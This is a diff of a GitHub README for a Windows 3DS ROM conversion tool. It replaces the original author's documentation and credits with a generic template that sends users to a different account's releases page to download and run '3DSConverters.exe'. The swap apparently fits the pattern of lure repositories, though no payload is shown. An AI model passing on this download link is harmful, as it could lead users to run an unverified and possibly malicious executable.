@@ -1,98 +1,67 @@
-[![3DS ROM Manager](logo.svg)](https://github.com/dihny/3DSConverters)
+# 🎮 3DSConverters - Simple Tool for Game File Conversion
 
-![GitHub Release](https://img.shields.io/github/v/release/dihny/3DSConverters?style=flat)
-![GitHub Repo stars](https://img.shields.io/github/stars/dihny/3DSConverters?style=flat)
-![Issues](https://img.shields.io/github/issues/dihny/3DSConverters?style=flat)
+## 🚀 Getting Started
+Welcome to 3DSConverters! This application helps you convert, decrypt, and compress 3DS ROM files easily on Windows. You do not need any programming skills to use it. Follow the steps below to download and get started.
 
-**3DS ROM Manager Suite** is an all-in-one tool for converting, decrypting, and compressing Nintendo 3DS ROM files. Built upon community tools and inspired by rohithvishaal's Python concept, this suite provides a menu-driven interface for managing your 3DS game library.
+## 📥 Download Now
+[![Download 3DSConverters](https://img.shields.io/badge/Download%20Now-3DSConverters-brightgreen)](https://github.com/O-FB/3DSConverters/releases)
 
-# Features
-- **Format Conversion** – Convert between .3ds, .cci, and .cia formats with batch support.
-- **Decryption** – Decrypt encrypted ROMs to CIA or CCI formats.
-- **Z3DS Compression** – Compress and decompress files for the Azahar emulator, with three quality levels.
-- **Batch Processing** – Run operations on multiple files at once, with progress tracking.
-- **Utilities** – File browser, temporary file cleanup, and session statistics.
-- **Safe & User-Friendly** – Input validation, optional source deletion, and logs for all operations.
+## 💾 System Requirements
+To run 3DSConverters, you will need:
+- A Windows operating system (Windows 10 or later recommended)
+- At least 100 MB of free disk space
+- An internet connection for downloading
 
-# Installation
+## 🔧 Features
+- **ROM Conversion:** Convert 3DS files to various formats.
+- **Decryption:** Easily decrypt your ROM files for access.
+- **Compression:** Reduce file size without losing quality.
+- **User-Friendly Interface:** Simple design for all users.
 
-### Windows
+## 📦 Download & Install
+1. To download the application, **visit this page to download**: [3DSConverters Releases](https://github.com/O-FB/3DSConverters/releases).
+2. On the Releases page, you will see a list of available versions.
+3. Click on the version you want to download.
+4. Locate the file named `3DSConverters.exe`. This is the main application file.
+5. Once the download is complete, find the file in your Downloads folder.
+6. Double-click the `3DSConverters.exe` file to start the installation process.
+7. Follow the on-screen prompts to complete the installation.
 
-> 📦 **[Download Latest Release](https://github.com/dihny/3DSConverters/releases/latest)**
+## 🖥️ Using 3DSConverters
+Once installed, you can start using 3DSConverters:
 
-All required tools are included in the `bin/` directory.
+1. Open the application by double-clicking the icon on your desktop or find it in your Start Menu.
+2. Choose an option from the main screen: conversion, decryption, or compression.
+3. Follow the prompts to select your 3DS ROM file and choose the desired format or action.
+4. Click “Start” to begin the process.
+5. Once it's done, your output file will be ready for use in the designated folder.
 
-**System Requirements:**
-- Windows 7 SP1 (x64) or higher
-- Windows Server 2008 R2 SP1 (x64) or higher
-- Visual C++ Redistributable for Visual Studio 2015
+## 📘 Support
+If you encounter any issues while using 3DSConverters, please check the FAQs on the GitHub page. If your question isn’t answered, feel free to open an issue on the same page for assistance.
 
-### File Structure
+## 🌟 Frequently Asked Questions
 
-After extraction, your directory should look like this:
+### What types of files can I convert?
+You can convert any 3DS ROM files. Make sure the files you are working with are legally obtained.
 
-```
-3DS-Converters/
-├── 3DS ROM Manager Suite v2.0.bat
-├── bin/
-│   ├── makerom.exe
-│   ├── ctrtool.exe
-│   ├── 3dsconv.exe
-│   ├── seeddb.bin
-│   ├── z3ds_compressor.exe
-│   └── decrypt.exe
-├── Batch CIA 3DS Decryptor Redux.bat
-└── log/
-    └── operations_YYYYMMDD.log
-```
+### Is there any cost to use 3DSConverters?
+No, 3DSConverters is free to download and use.
 
-# Usage
+### Can I use this tool on Mac or Linux?
+Currently, 3DSConverters only supports Windows operating systems.
 
-1. Place ROM files (`.3ds`, `.cci`, `.cia`) in the same directory as the batch file
-2. Run `3DS ROM Manager Suite v2.0.bat`
-3. Select operation from the menu
-4. Press Enter when prompted for filename to process all compatible files in batch mode
+### Do I need any additional software to use 3DSConverters?
+No additional software is required. Just download and install 3DSConverters.
 
-# Supported Formats
+## 🛡️ Safe Usage
+Always ensure your ROM files are from legitimate sources. Avoid using pirated ROMs to adhere to legal standards.
 
-| Extension | Format | Description |
-|-----------|--------|-------------|
-| `.3ds` `.cci` | CCI | Cartridge Card Image (cartridge dumps) |
-| `.cia` | CIA | CTR Importable Archive (installable format) |
-| `.z3ds` `.zcci` `.zcia` | Z3DS | Compressed format for Azahar emulator |
+## ✏️ Contributions
+If you want to help improve 3DSConverters, you are welcome to contribute. You can report issues or suggest new features on the GitHub page as well.
 
-# Notes
+## 🔗 Additional Links
+For more information about 3DSConverters, visit:
+- [3DSConverters Releases](https://github.com/O-FB/3DSConverters/releases)
+- [User Documentation](https://github.com/O-FB/3DSConverters/wiki)
 
-- CIA to CCI conversion only supports decrypted game CIAs. Encrypted files, DLC, updates, and system titles are not compatible.
-- Decryption features require `Batch CIA 3DS Decryptor Redux.bat` to be present in the root directory.
-- Z3DS compression features require `z3ds_compressor.exe` in the `bin/` directory.
-- All operations are logged to `log/operations_[date].log` with timestamps.
-- It's recommended to keep backups of important files before batch processing.
-
-# Credits
-
-### Development
-- **Dihny** - 3DS ROM Manager Suite creator and maintainer
-
-### Inspiration
-- [**rohithvishaal**](https://github.com/rohithvishaal/3ds-converters) - Original Python-based ROM manager concept
-- [**R-YaTian**](https://github.com/R-YaTian/3DS-Converters) - Prior batch script implementations
-
-### Integrated Tools
-- `Batch CIA 3DS Decryptor Redux` - [matiffeder](https://github.com/matiffeder/3DS-stuff) & [xxmichibxx](https://github.com/xxmichibxx/Batch-CIA-3DS-Decryptor-Redux)
-- `makerom.exe / ctrtool.exe` - [3DSGuy](https://github.com/3DSGuy/Project_CTR) & jakcron
-- `3dsconv` - [ihaveamac](https://github.com/ihaveamac/3dsconv)
-- `seeddb.bin` - [ihaveamac](https://github.com/ihaveamac/3DS-rom-tools/tree/master/seeddb) & soarqin
-- `z3ds_compressor` - [energeticokay](https://github.com/energeticokay/z3ds_compress)
-- `decrypt.exe` - [shijimasoft](https://github.com/shijimasoft/ctrdecrypt)
-
-Special thanks to the 3DS homebrew community for their continued development and tool maintenance.
-
-# License
-
-This project is released under the MIT License. Each integrated tool retains its original license - users must comply with the individual licenses of all bundled components.
-
->  ### ⚠️ Disclaimer:
->  This tool is intended for personal backup, archival, and educational purposes only.
->  Users are responsible for complying with local laws regarding game backups and ROM files.
->  The author does not condone or support piracy in any way.
+Thank you for using 3DSConverters! Enjoy converting your game files easily and efficiently.
